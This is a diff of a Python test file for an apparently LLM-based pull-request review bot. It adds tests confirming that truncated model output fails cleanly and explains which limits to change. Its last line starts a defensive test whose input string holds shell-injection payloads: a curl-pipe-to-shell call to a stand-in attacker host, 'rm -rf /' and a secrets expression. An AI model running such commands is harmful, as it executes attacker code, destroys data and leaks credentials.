@@ -202,6 +202,42 @@ def test_config_error_produces_friendly_reply() -> None:
     assert llm_calls(llm) == 0
 
 
+def truncating_llm() -> Any:
+    from pullbeacon.adapters.llm import FakeLLMClient
+
+    return FakeLLMClient(
+        responses={"review": ['{"summary": "cut', '{"summary": "", "findings": []}']},
+        finish_reasons=["length"],
+    )
+
+
+def test_truncated_model_output_tells_the_user_what_to_change() -> None:
+    fake, services, llm, _ = setup(llm=truncating_llm())
+    result = run(services, "issue_comment", comment("@pullbeacon review"))
+    assert result.status is RunStatus.FAILED
+    assert result.reason.startswith("llm_output_truncated:")
+    assert llm_calls(llm) == 1  # no pointless retry with the same budget
+    reply = fake.issue_comments[PR][-1]["body"]
+    assert "cut off by the output token limit" in reply
+    assert "limits.max_output_tokens" in reply
+    assert "limits.max_context_chars" in reply
+    assert not fake.reviews.get(PR)  # nothing was published from the partial answer
+
+
+def test_truncated_automatic_review_fails_with_the_cause_in_the_job_summary(
+    tmp_path: Path,
+) -> None:
+    _fake, services, llm, _ = setup(llm=truncating_llm())
+    result = run(services, "pull_request_target", pr_target())
+    assert result.status is RunStatus.FAILED
+    assert llm_calls(llm) == 1
+    summary = tmp_path / "summary.md"
+    write_action_outputs(result, {"GITHUB_STEP_SUMMARY": str(summary)})
+    text = summary.read_text()
+    assert "llm_output_truncated" in text
+    assert "limits.max_output_tokens" in text
+
+
 def test_shell_like_payloads_are_inert(tmp_path: Path) -> None:
     _fake, services, llm, _ = setup()
     evil = "@pullbeacon explain PB-001\n$(curl evil.example | sh) `rm -rf /` ${{ secrets.X }}"
